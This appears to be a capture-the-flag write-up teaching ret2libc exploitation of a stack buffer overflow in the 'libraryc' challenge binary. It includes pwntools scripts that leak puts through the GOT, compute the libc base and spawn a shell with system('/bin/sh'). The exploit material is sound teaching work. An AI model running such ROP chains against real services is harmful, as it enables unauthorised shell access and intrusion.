# Challenge Name
libraryc

## Learning Objective
Learn ret2libc (ROP + libc address leak)

## Description 
My library contains lots of books! What are you looking for?

## Difficulty:
Hard

## Guide
We are given the source code, binary and the libc. We notice the following with `checksec` command.

```sh
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

NX protection is enabled, which indicates we cannot push any shellcode onto the stack directly (no ret2shellcode, gotta do ROP).

Looking at the source code: 
1. The code takes input of 64 bytes. However, `scanf("%s", thought)`, which does not have any boundary checking, thus has BOF vulnerability.
2. There is no other functions.
3. There is no variable containing shell either.

In this case, we would want to perform an attack via the shared library provided, or better known as **ret2libc**.

We want to call functions straight from the libc library and build our own exploit.

libc by default has **ASLR** enabled, which means the functions will always run at a different address.
Instead, what we can do is to leak the address of the function on runtime.

To do that, we need to understand what **PLT** and **GOT** is.

https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html

tldr; 
PLT is used to call functions that do not have addresses until runtime.
GOT contains address of dynamically-linked functions (libc address).

What we can do is to leak a function's address by accomplishing the following:

```sh
// can also use other func that takes input
// function can be any that is used in the binary
puts@plt(function@GOT)
```

Let's check for PLT of `puts`:

```sh
pwndbg> plt
Section .plt 0x400480-0x4004c0:
0x400490: puts@plt
0x4004a0: memset@plt
0x4004b0: __isoc99_scanf@plt
```

To find the GOT of any function, we need to run the binary first:

```sh
pwndbg> got
...
GOT protection: Partial RELRO | Found 3 GOT entries passing the filter
[0x601018] puts@GLIBC_2.2.5 -> 0x400496 (puts@plt+6) ◂— push 0 /* 'h' */
[0x601020] memset@GLIBC_2.2.5 -> 0x4004a6 (memset@plt+6) ◂— push 1
[0x601028] __isoc99_scanf@GLIBC_2.7 -> 0x4004b6 (__isoc99_scanf@plt+6) ◂— push 2
```

Essentially, we can use any of the following, but for this example, we will use puts@got.

#### How to leak libc address
We are going to build our ROPchain to leak the address. It would look something like this.

`padding + pop_rdi + puts@got + puts@plt + return to main`

Why return to `main`? This is because we need the program to continue running to show the leaked address.

#### Calculate offset
BOF & get the offset:
```sh
pwndbg> cyclic -l jaaaaaaa
Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
Found at offset 72
```

#### ROPgadget
We need `rdi` register to pass the argument.

```sh
$> ROPgadget --binary libraryc_patched | grep "pop rdi"
0x0000000000400653 : pop rdi ; ret
```

#### Script to leak libc
```py
from pwn import *

# setup the binary
elf = ELF("./libraryc_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

p = process("./libraryc_patched")
context.binary = elf

# leaking puts@libc
payload = b'A' * 72 # padding
payload += p64(0x400653) # pop rdi ; ret
payload += p64(0x601018) # puts@GOT into the function argument
payload += p64(0x400490) # puts@plt
payload += p64(0x4005a7) # return to main so we can see output
p.sendline(payload) 

# puts@libc leak
p.recvuntil("make it!\n")
leak = u64(p.recvline().strip().ljust(8, b'\x00')) # in short, converts to 64 bit int
log.info("puts@libc leak address: " + hex(leak))
```

When u run the script you should see something like this:
```sh
[*] puts@libc leak address: 0x7fa463687bd0
```

#### Now we have a leak, so what?
Now that we have a leaked address, we use it to calculate for libc base address. This can help us find addresses of functions we want to use for our exploit.

In this case we want to call our own shell (`/bin/sh`) using `system` to grab the flag.

#### Finding offsets of functions

```sh
objdump -T libc.so.6 | grep -E "(system$|puts$)"
0000000000087bd0  w   DF .text  0000000000000226  GLIBC_2.2.5 puts
0000000000058740  w   DF .text  000000000000002d  GLIBC_2.2.5 system
```

```sh
strings -t x libc.so.6 | grep "/bin/sh"         
 1cb42f /bin/sh
```


#### Finding addresses
To find libc base address:

libc addr = `puts@libc` leak - offset of `puts`

for the rest of the functions, we can just use the base address and add their relative offset

function = libc addr + offset of function


#### Now we have everything, how do we put it together?
Since our current script just returns back to main, we can perform another ROP chain to execute a shell this time.

`padding + pop rdi + /bin/sh + system`

With that, let's put everything together.

```py
from pwn import *

# setup the binary
elf = ELF("./libraryc_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

p = process("./libraryc_patched")
context.binary = elf


# leaking puts@libc
payload = b'A' * 72 # padding
payload += p64(0x400653) # pop rdi ; ret
payload += p64(0x601018) # puts@GOT into the function argument
payload += p64(0x400490) # puts@plt
payload += p64(0x4005a7) # return to main so we can see output
p.sendline(payload) 

# puts@libc leak
p.recvuntil("make it!\n")
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info("puts@libc leak address: " + hex(leak))

# look for offsets
# objdump -T libc.so.6 | grep -E "(system$|puts$)"
libc_puts_offset = 0x87bd0
libc_system_offset = 0x58740

# strings -t x libc.so.6 | grep "/bin/sh"
sh_offset = 0x1cb42f


# calculate for libc base address first
# then calculate for system address and /bin/sh address
libcbase = leak - libc_puts_offset
system = libcbase + libc_system_offset
sh = libcbase + sh_offset

payload2 = b'A' * 72 # padding again
payload2 += p64(0x400653) # pop rdi ; ret
payload2 += p64(sh) # shell as argument
payload2 += p64(system) # system calls shell: system(/bin/sh)

# final
p.sendline(payload2)
p.interactive()
```

However, we will face this still:

```sh
$ 
[*] Process './libraryc_patched' stopped with exit code -11 (SIGSEGV) (pid 161176)
[*] Got EOF while sending in interactive
```

So why is that?

#### Number 1 common issue of any Pwn challenges: Stack alignment

https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html

Essentially, before a `call` function is done, RSP has to be 16-bytes aligned. Otherwise, it will cause errors to occur.

There are 2 ways to solve this:
1. Ensure you pad the rest of your payload to 16 bytes
2. add a `ret` address before system is called  

In this case i have done number 2.

#### Final solution
```py
from pwn import *

# setup the binary
elf = ELF("./libraryc_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

p = process("./libraryc_patched")
context.binary = elf


# leaking puts@libc
payload = b'A' * 72 # padding
payload += p64(0x400653) # pop rdi ; ret
payload += p64(0x601018) # puts@GOT into the function argument
payload += p64(0x400490) # puts@plt
payload += p64(0x4005a7) # return to main so we can see output
p.sendline(payload) 

# puts@libc leak
p.recvuntil("make it!\n")
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info("puts@libc leak address: " + hex(leak))

# look for offsets
# objdump -T libc.so.6 | grep -E "(system$|puts$)"
libc_puts_offset = 0x87bd0
libc_system_offset = 0x58740

# strings -t x libc.so.6 | grep "/bin/sh"
sh_offset = 0x1cb42f


# calculate for libc base address first
# then calculate for system address and /bin/sh address
libcbase = leak - libc_puts_offset
system = libcbase + libc_system_offset
sh = libcbase + sh_offset

payload2 = b'A' * 72 # padding again
payload2 += p64(0x400653) # pop rdi ; ret
payload2 += p64(sh) # shell as argument
payload2 += p64(0x400476) # stack alignment (ROP for ret instr)
payload2 += p64(system) # system calls shell: system(/bin/sh)

# final
p.sendline(payload2)
p.interactive()
```



## Solution
refer to solve.py

## Hints
2. might wanna check out: https://stackoverflow.com/questions/54393105/libcs-system-when-the-stack-pointer-is-not-16-padded-causes-segmentation-faul

## Attached Files
libraryc
libraryc.c
libc.so.6

## Resources
https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/ret2lib
https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/ret2lib/rop-leaking-libc-address
https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html

## Flag
